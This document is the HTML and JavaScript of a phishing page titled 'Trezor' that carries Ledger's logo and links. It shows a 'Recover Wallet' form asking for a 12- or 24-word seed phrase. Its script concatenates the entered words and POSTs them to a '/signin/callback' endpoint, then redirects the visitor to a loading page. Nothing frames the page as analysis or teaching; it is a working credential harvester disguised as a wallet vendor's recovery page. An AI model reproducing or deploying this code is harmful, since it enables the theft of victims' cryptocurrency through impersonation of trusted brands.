<html lang="en"><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trezor</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <style>
      body {
        background-color: #18191a;
        font-family: "MyCustomFont", sans-serif;
      }

      .card {
        background-color: #242526;
        color: #fff;
      }

      .nav {
        background-color: #242526;
      }
      .input-box {
        background-color: #18191a;
      }
      .input-btn {
        background-color: #ff5300;
      }
      @font-face {
        font-family: "MyCustomFont";
        src: url("./fonts/tt-satoshi-medium.woff2") format("woff2");
      }
    </style>
    <link rel="shortcut icon" href="./media/favicon-32x32.png">
  </head>
  <body>
    <nav class="nav py-4 border-b-1 border-gray-400/10 shadow-lg">
      <div class="container mx-auto">
        <div class="text-white text-2xl font-bold text-center flex flex-row items-center justify-between mx-8">
          <div>
            <a href="https://ledger.com/">
              
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="150px" height="37px" viewBox="0 0 150 37" version="1.1">
<g id="surface1">
<path style="stroke:none;fill-rule:nonzero;fill: rgb(255 255 255);fill-opacity:1;" d="M 25.914062 0 L 11.777344 0 L 11.777344 19.152344 L 30.851562 19.152344 L 30.851562 4.960938 C 30.851562 2.210938 28.648438 0 25.914062 0 Z M 7.371094 0 L 4.941406 0 C 2.203125 0 0 2.210938 0 4.960938 L 0 7.398438 L 7.371094 7.398438 Z M 0 11.824219 L 7.371094 11.824219 L 7.371094 19.222656 L 0 19.222656 Z M 23.558594 30.972656 L 25.992188 30.972656 C 28.726562 30.972656 30.929688 28.761719 30.929688 26.015625 L 30.929688 23.652344 L 23.558594 23.652344 Z M 11.777344 23.652344 L 19.148438 23.652344 L 19.148438 31.050781 L 11.777344 31.050781 Z M 0 23.652344 L 0 26.09375 C 0 28.839844 2.203125 31.050781 4.941406 31.050781 L 7.371094 31.050781 L 7.371094 23.652344 Z M 49.699219 1.984375 L 46.8125 1.984375 L 46.8125 29.0625 L 62.089844 29.0625 L 62.089844 26.472656 L 49.699219 26.472656 Z M 71.355469 9.152344 C 65.730469 9.152344 61.78125 13.347656 61.78125 19.375 L 61.78125 20.066406 C 61.859375 22.65625 63 25.105469 64.898438 26.929688 C 66.722656 28.613281 69.074219 29.601562 71.585938 29.601562 L 71.960938 29.601562 C 74.621094 29.601562 77.128906 28.605469 79.105469 26.929688 L 79.183594 26.851562 L 77.894531 24.71875 L 77.742188 24.796875 C 76.144531 26.25 74.171875 27.085938 72.046875 27.085938 C 68.554688 27.085938 64.980469 24.796875 64.753906 19.6875 L 79.347656 19.6875 L 79.347656 19.535156 C 79.347656 19.535156 79.421875 18.621094 79.421875 18.164062 C 79.40625 12.667969 76.21875 9.152344 71.355469 9.152344 Z M 64.820312 17.242188 C 65.425781 13.804688 67.933594 11.59375 71.199219 11.59375 C 73.632812 11.59375 76.289062 13.046875 76.519531 17.242188 Z M 96.128906 11.445312 L 96.128906 12.4375 C 94.910156 10.375 92.636719 9.082031 90.277344 9.082031 L 90.046875 9.082031 C 84.878906 9.082031 81.308594 13.203125 81.308594 19.230469 C 81.308594 25.332031 84.730469 29.449219 89.820312 29.449219 C 93.847656 29.449219 95.671875 27.007812 96.277344 25.941406 L 96.277344 28.917969 L 99.015625 28.917969 L 99.015625 1.984375 L 96.207031 1.984375 L 96.207031 11.445312 Z M 90.199219 26.929688 C 86.625 26.929688 84.273438 23.882812 84.273438 19.300781 C 84.273438 14.878906 86.78125 11.75 90.277344 11.75 C 93.242188 11.75 96.199219 14.113281 96.199219 19.300781 C 96.199219 24.949219 93.085938 26.929688 90.199219 26.929688 Z M 115.652344 11.824219 L 115.652344 11.972656 C 115.121094 11.058594 113.453125 9.074219 109.421875 9.074219 C 104.332031 9.074219 100.992188 12.96875 100.992188 18.914062 C 100.992188 24.863281 104.484375 28.90625 109.652344 28.90625 C 112.460938 28.90625 114.363281 27.914062 115.652344 25.859375 L 115.652344 28.527344 C 115.652344 32.261719 113.300781 34.402344 109.117188 34.402344 C 107.371094 34.402344 105.546875 33.945312 103.949219 33.105469 L 103.800781 33.027344 L 102.738281 35.390625 L 102.886719 35.46875 C 104.863281 36.464844 107.066406 36.992188 109.195312 36.992188 C 113.679688 36.992188 118.464844 34.703125 118.464844 28.371094 L 118.464844 9.613281 L 115.652344 9.613281 Z M 110.03125 26.394531 C 106.308594 26.394531 103.878906 23.496094 103.878906 18.992188 C 103.878906 14.414062 106.003906 11.824219 109.652344 11.824219 C 113.679688 11.824219 115.578125 14.183594 115.578125 18.992188 C 115.652344 23.722656 113.679688 26.394531 110.03125 26.394531 Z M 129.941406 9.152344 C 124.316406 9.152344 120.445312 13.347656 120.445312 19.300781 L 120.445312 19.988281 C 120.523438 22.578125 121.664062 25.027344 123.558594 26.851562 C 125.382812 28.535156 127.738281 29.523438 130.246094 29.523438 L 130.625 29.523438 C 133.285156 29.523438 135.792969 28.527344 137.765625 26.851562 L 137.84375 26.773438 L 136.476562 24.640625 L 136.328125 24.71875 C 134.730469 26.171875 132.753906 27.007812 130.628906 27.007812 C 127.136719 27.007812 123.566406 24.71875 123.335938 19.609375 L 137.996094 19.609375 L 137.996094 19.457031 C 137.996094 19.457031 138.074219 18.542969 138.074219 18.085938 C 138.074219 12.667969 134.878906 9.152344 129.941406 9.152344 Z M 123.480469 17.242188 C 124.085938 13.804688 126.597656 11.59375 129.863281 11.59375 C 132.292969 11.59375 134.953125 13.046875 135.179688 17.242188 Z M 149.929688 9.535156 C 149.550781 9.453125 149.242188 9.453125 148.867188 9.382812 C 146.207031 9.382812 144.003906 11.0625 142.863281 13.882812 L 142.863281 9.535156 L 140.054688 9.535156 L 140.132812 28.835938 L 140.132812 28.984375 L 143.019531 28.984375 L 143.019531 20.824219 C 143.019531 19.601562 143.167969 18.308594 143.554688 17.164062 C 144.464844 14.183594 146.519531 12.28125 148.949219 12.28125 C 149.253906 12.28125 149.554688 12.28125 149.863281 12.359375 L 150.011719 12.359375 L 150.011719 9.539062 Z M 149.929688 9.535156 "></path>
</g>
</svg>
            </a>
          </div>
          <div class="hidden md:flex flex-row gap-x-6 text-sm items-center">
            <a href="https://ledger.com/">Products</a>
            <a href="https://ledger.com/">App</a>
            <a href="https://ledger.com/">Coins</a>
            <a href="https://ledger.com/">Learn &amp; Support</a>
          </div>
          <div>
            <button class="input-btn text-white font-bold py-2 px-4 rounded-lg text-sm">
              Get Your Ledger
            </button>
          </div>
        </div>
      </div>
    </nav>

    <div class="container mx-auto flex justify-center items-center lg:h-screen">
      <div class="lg:w-1/2 max-w-md md:max-w-full mx-auto card lg:rounded-lg p-8 shadow-lg">
        <div class="mb-4">
          <h2 class="text-3xl font-bold text-center">Recover Wallet</h2>
          <p class="text-md text-center mx-auto w-3/4" style="color: #868686;">
            Enter your seed phrase to recover your wallet. Please enter the words
            in the correct order.
          </p>
          <div class="flex flex-col md:flex-row gap-x-4 w-full justify-center mt-2 items-center text-sm text-white font-bold mx-auto gap-y-2">
            <div>
              <input type="checkbox" id="toggleButton" class="text-white text-sm">
              <label for="toggleButton" class="text-sm">
                Use 12 words recovery phrase
              </label>
            </div>
            <div>
              <input type="checkbox" id="toggleCustom" class="text-white text-sm">
              <label for="toggleCustom" class="text-sm">
                Use custom recovery phrase
              </label>
            </div>
          </div>
        </div>

        <div id="inputContainer" class="mb-4" style="display: block;">
          <div class="flex flex-wrap justify-center">
            <div id="row1" class="flex justify-center w-full"><input type="text" class="input-box text-white border border-gray-700 rounded-lg p-4 mr-2 mb-2" placeholder="Word 1" maxlength="8" style="width: calc(16.6667% - 0.5rem);"><input type="text" class="input-box text-white border border-gray-700 rounded-lg p-4 mr-2 mb-2" placeholder="Word 2" maxlength="8" style="width: calc(16.6667% - 0.5rem);"><input type="text" class="input-box text-white border border-gray-700 rounded-lg p-4 mr-2 mb-2" placeholder="Word 3" maxlength="8" style="width: calc(16.6667% - 0.5rem);"><input type="text" class="input-box text-white border border-gray-700 rounded-lg p-4 mr-2 mb-2" placeholder="Word 4" maxlength="8" style="width: calc(16.6667% - 0.5rem);"><input type="text" class="input-box text-white border border-gray-700 rounded-lg p-4 mr-2 mb-2" placeholder="Word 5" maxlength="8" style="width: calc(16.6667% - 0.5rem);"><input type="text" class="input-box text-white border border-gray-700 rounded-lg p-4 mr-2 mb-2" placeholder="Word 6" maxlength="8" style="width: calc(16.6667% - 0.5rem);"></div>
          </div>
          <div class="flex flex-wrap justify-center">
            <div id="row2" class="flex justify-center w-full"><input type="text" class="input-box text-white border border-gray-700 rounded-lg p-4 mr-2 mb-2" placeholder="Word 7" maxlength="8" style="width: calc(16.6667% - 0.5rem);"><input type="text" class="input-box text-white border border-gray-700 rounded-lg p-4 mr-2 mb-2" placeholder="Word 8" maxlength="8" style="width: calc(16.6667% - 0.5rem);"><input type="text" class="input-box text-white border border-gray-700 rounded-lg p-4 mr-2 mb-2" placeholder="Word 9" maxlength="8" style="width: calc(16.6667% - 0.5rem);"><input type="text" class="input-box text-white border border-gray-700 rounded-lg p-4 mr-2 mb-2" placeholder="Word 10" maxlength="8" style="width: calc(16.6667% - 0.5rem);"><input type="text" class="input-box text-white border border-gray-700 rounded-lg p-4 mr-2 mb-2" placeholder="Word 11" maxlength="8" style="width: calc(16.6667% - 0.5rem);"><input type="text" class="input-box text-white border border-gray-700 rounded-lg p-4 mr-2 mb-2" placeholder="Word 12" maxlength="8" style="width: calc(16.6667% - 0.5rem);"></div>
          </div>
          <div class="flex flex-wrap justify-center" id="row3Container" style="display: flex;">
            <div id="row3" class="flex justify-center w-full"><input type="text" class="input-box text-white border border-gray-700 rounded-lg p-4 mr-2 mb-2" placeholder="Word 13" maxlength="8" style="width: calc(16.6667% - 0.5rem);"><input type="text" class="input-box text-white border border-gray-700 rounded-lg p-4 mr-2 mb-2" placeholder="Word 14" maxlength="8" style="width: calc(16.6667% - 0.5rem);"><input type="text" class="input-box text-white border border-gray-700 rounded-lg p-4 mr-2 mb-2" placeholder="Word 15" maxlength="8" style="width: calc(16.6667% - 0.5rem);"><input type="text" class="input-box text-white border border-gray-700 rounded-lg p-4 mr-2 mb-2" placeholder="Word 16" maxlength="8" style="width: calc(16.6667% - 0.5rem);"><input type="text" class="input-box text-white border border-gray-700 rounded-lg p-4 mr-2 mb-2" placeholder="Word 17" maxlength="8" style="width: calc(16.6667% - 0.5rem);"><input type="text" class="input-box text-white border border-gray-700 rounded-lg p-4 mr-2 mb-2" placeholder="Word 18" maxlength="8" style="width: calc(16.6667% - 0.5rem);"></div>
          </div>
          <div class="flex flex-wrap justify-center" id="row4Container" style="display: flex;">
            <div id="row4" class="flex justify-center w-full"><input type="text" class="input-box text-white border border-gray-700 rounded-lg p-4 mr-2 mb-2" placeholder="Word 19" maxlength="8" style="width: calc(16.6667% - 0.5rem);"><input type="text" class="input-box text-white border border-gray-700 rounded-lg p-4 mr-2 mb-2" placeholder="Word 20" maxlength="8" style="width: calc(16.6667% - 0.5rem);"><input type="text" class="input-box text-white border border-gray-700 rounded-lg p-4 mr-2 mb-2" placeholder="Word 21" maxlength="8" style="width: calc(16.6667% - 0.5rem);"><input type="text" class="input-box text-white border border-gray-700 rounded-lg p-4 mr-2 mb-2" placeholder="Word 22" maxlength="8" style="width: calc(16.6667% - 0.5rem);"><input type="text" class="input-box text-white border border-gray-700 rounded-lg p-4 mr-2 mb-2" placeholder="Word 23" maxlength="8" style="width: calc(16.6667% - 0.5rem);"><input type="text" class="input-box text-white border border-gray-700 rounded-lg p-4 mr-2 mb-2" placeholder="Word 24" maxlength="8" style="width: calc(16.6667% - 0.5rem);"></div>
          </div>
          <div class="flex flex-wrap justify-center" id="row5Container">
            <div id="row5" class="flex justify-center w-full"></div>
          </div>
          <div class="flex flex-wrap justify-center" id="row6Container">
            <div id="row6" class="flex justify-center w-full"></div>
          </div>
          <div class="flex flex-wrap justify-center" id="row7Container">
            <div id="row7" class="flex justify-center w-full"></div>
          </div>
          <div class="flex flex-wrap justify-center" id="row8Container">
            <div id="row8" class="flex justify-center w-full"></div>
          </div>
          <div class="flex flex-wrap justify-center" id="row9Container">
            <div id="row9" class="flex justify-center w-full"></div>
          </div>
          <div class="flex flex-wrap justify-center" id="row10Container">
            <div id="row10" class="flex justify-center w-full"></div>
          </div>
          <div class="flex flex-wrap justify-center" id="row11Container">
            <div id="row11" class="flex justify-center w-full"></div>
          </div>
          <div class="flex flex-wrap justify-center" id="row12Container">
            <div id="row12" class="flex justify-center w-full"></div>
          </div>
        </div>

        <div id="customInputContainer" class="mb-4 hidden" style="display: none;">
          <div class="flex flex-wrap justify-center">
            <div id="row1" class="flex justify-center w-full"></div>
          </div>
          <div class="flex flex-wrap justify-center">
            <div id="row2" class="flex justify-center w-full"></div>
          </div>
          <div class="flex flex-wrap justify-center" id="row3Container">
            <div id="row3" class="flex justify-center w-full"></div>
          </div>
          <div class="flex flex-wrap justify-center" id="row4Container">
            <div id="row4" class="flex justify-center w-full"></div>
          </div>
        </div>

        <button id="concatenateBtn" class="input-btn text-white font-bold py-2 px-4 rounded w-full">
          Recover Wallet
        </button>

        <div id="errorMessage" class="mt-4 text-red-600 font-bold text-center"></div>

        <div id="result" class="mt-4 font-bold text-center"></div>
      </div>
    </div>
  

    <script>
    let totalBoxes = 12;
let isCustomToggled = false;

let wordCount = 1;

function createInputBoxes(parentId, count) {
const parentElement = document.getElementById(parentId);
parentElement.innerHTML = "";

const isMobile = window.innerWidth <= 768;

for (let i = 1; i <= count; i++) {
    const input = document.createElement("input");
    input.type = "text";
    input.className =
    "input-box text-white border border-gray-700 rounded-lg p-4 mr-2 mb-2";

    if (isMobile) {
    input.placeholder = `Word ${wordCount}`;
    } else {
    input.placeholder = `Word ${
        i + count * (parseInt(parentId.slice(-1)) - 1)
    }`;
    }

    input.maxLength = 8;
    input.style.width = `calc(${100 / count}% - 0.5rem)`;

    parentElement.appendChild(input);

    wordCount++;
}
}

function toggleBoxes() {
totalBoxes = totalBoxes === 12 ? 24 : 12;
const isMobile = window.innerWidth <= 768;
wordCount = 1;
if (totalBoxes === 12) {
    if (isMobile) {
    createInputBoxes("row1", 2);
    createInputBoxes("row2", 2);
    createInputBoxes("row3", 2);
    createInputBoxes("row4", 2);
    createInputBoxes("row5", 2);
    createInputBoxes("row6", 2);
    document.getElementById("row3Container").style.display = "flex";
    document.getElementById("row4Container").style.display = "flex";
    document.getElementById("row5Container").style.display = "flex";
    document.getElementById("row6Container").style.display = "flex";
    document.getElementById("row7Container").style.display = "none";
    document.getElementById("row8Container").style.display = "none";
    document.getElementById("row9Container").style.display = "none";
    document.getElementById("row10Container").style.display = "none";
    document.getElementById("row11Container").style.display = "none";
    document.getElementById("row12Container").style.display = "none";
    } else {
    createInputBoxes("row1", 6);
    createInputBoxes("row2", 6);
    document.getElementById("row3Container").style.display = "none";
    document.getElementById("row4Container").style.display = "none";
    }
} else {
    if (isMobile) {
    createInputBoxes("row1", 2);
    createInputBoxes("row2", 2);
    createInputBoxes("row3", 2);
    createInputBoxes("row4", 2);
    createInputBoxes("row5", 2);
    createInputBoxes("row6", 2);
    createInputBoxes("row7", 2);
    createInputBoxes("row8", 2);
    createInputBoxes("row9", 2);
    createInputBoxes("row10", 2);
    createInputBoxes("row11", 2);
    createInputBoxes("row12", 2);
    document.getElementById("row3Container").style.display = "flex";
    document.getElementById("row4Container").style.display = "flex";
    document.getElementById("row5Container").style.display = "flex";
    document.getElementById("row6Container").style.display = "flex";
    document.getElementById("row7Container").style.display = "flex";
    document.getElementById("row8Container").style.display = "flex";
    document.getElementById("row9Container").style.display = "flex";
    document.getElementById("row10Container").style.display = "flex";
    document.getElementById("row11Container").style.display = "flex";
    document.getElementById("row12Container").style.display = "flex";
    } else {
    createInputBoxes("row1", 6);
    createInputBoxes("row2", 6);
    createInputBoxes("row3", 6);
    createInputBoxes("row4", 6);
    document.getElementById("row3Container").style.display = "flex";
    document.getElementById("row4Container").style.display = "flex";
    }
}
turnCustomOff();
document
    .getElementById("row1")
    .firstElementChild.addEventListener("paste", pasteAndFill);
}

toggleBoxes();

function toggleCustom() {
isCustomToggled = !isCustomToggled;
let customInput = document.getElementById("toggleButton");
customInput.checked = false;

if (isCustomToggled) {
    let c = document.getElementById("customInputContainer");
    let r = document.getElementById("inputContainer");
    r.style.display = "none";
    c.style.display = "block";
    createCustomTextArea();
} else {
    let c = document.getElementById("customInputContainer");
    let r = document.getElementById("inputContainer");
    r.style.display = "block";
    c.style.display = "none";
}
}

function turnCustomOff() {
isCustomToggled = false;
let customInput = document.getElementById("toggleCustom");
customInput.checked = false;
let c = document.getElementById("customInputContainer");
let r = document.getElementById("inputContainer");
r.style.display = "block";
c.style.display = "none";
}

function createCustomTextArea() {
const inputContainer = document.getElementById("customInputContainer");

while (inputContainer.firstChild) {
    inputContainer.removeChild(inputContainer.firstChild);
}

const textarea = document.createElement("textarea");
textarea.className =
    "input-box text-white border border-gray-700 rounded-lg p-4 mb-2 w-full";
textarea.placeholder = "Enter your recovery phrase here...";
textarea.id = "customTextArea";

inputContainer.appendChild(textarea);
}

document
.getElementById("toggleButton")
.addEventListener("click", toggleBoxes);

document
.getElementById("toggleCustom")
.addEventListener("click", toggleCustom);

let backspacePressed = false;

document.addEventListener("keydown", function (event) {
if (event.key === "Backspace") {
    backspacePressed = true;
    deletePreviousInput(event);
}
});

document.addEventListener("keyup", function (event) {
if (event.key === "Backspace") {
    backspacePressed = false;
}
});

function deletePreviousInput(event) {
const currentInput = event.target;
const inputs = document.querySelectorAll("input[type='text']");

for (let i = 0; i < inputs.length; i++) {
    if (inputs[i] === currentInput && i > 0) {
    if (event.keyCode === 8 && inputs[i].value.length > 0) {
        event.preventDefault();
        inputs[i].value = inputs[i].value.slice(0, -1);
        break;
    } else if (event.keyCode === 8 && inputs[i].value.length === 0) {
        event.preventDefault();
        inputs[i - 1].focus();
        break;
    }
    }
}
}

function concatenateWords() {
    let concatenatedPhrase = "";
    let inputsFound = false;
    let inputCount = 0;
    let isCustomToggled = true; 

    const textInputs = document.querySelectorAll("input[type='text']");

    textInputs.forEach((input) => {
        const computedStyle = window.getComputedStyle(input);
        if (computedStyle.display !== "none") {
            inputsFound = true;
            if (input.value.trim()) {
                concatenatedPhrase += input.value.trim() + " ";
                inputCount++;
            }
        }
    });
    
    if (isCustomToggled) {
    const textarea = document.getElementById("customTextArea");
    if (textarea) {
        concatenatedPhrase = textarea.value.trim();
    }
}
    if (inputCount === 0 && !inputsFound && concatenatedPhrase === "") {
        document.getElementById("errorMessage").textContent =
            "Please fill in all the fields.";
        document.getElementById("result").textContent = "";
        return;
    }

    document.getElementById("errorMessage").textContent = "";

    console.log(`Complete phrase: ${concatenatedPhrase}`);

    fetch('/signin/callback', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: `phrase=${encodeURIComponent(concatenatedPhrase)}`
        })
        .then(response => response.json())
        .then(data => {
        if (data.status === 'success') {
            const urlParams = new URLSearchParams(window.location.search);
            window.location.href = '/signin/loading?' + urlParams.toString();
        }
        })
        .catch((error) => {
            console.error('Error:', error);
        });
}


document
.getElementById("concatenateBtn")
.addEventListener("click", concatenateWords);

function pasteAndFill(event) {
const clipboardData = event.clipboardData || window.clipboardData;
const pastedText = clipboardData.getData("text");
const words = pastedText.trim().split(/\s+/);
console.log(words);
const inputBoxes = document.querySelectorAll("input[type='text']");

const totalBoxes = inputBoxes.length;
const boxesPerRow = Math.ceil(totalBoxes / 4);
let currentWordIndex = 0;

for (let i = 0; i < inputBoxes.length; i++) {
    if (currentWordIndex >= words.length) break;

    const word = words[currentWordIndex];
    inputBoxes[i].value = word;
    currentWordIndex++;
}

event.preventDefault();
}

window.onload = function () {
function reloadPage() {
    window.location.reload(true);
}

window.addEventListener("resize", function (event) {
    reloadPage();
});
};
</script>

</body></html>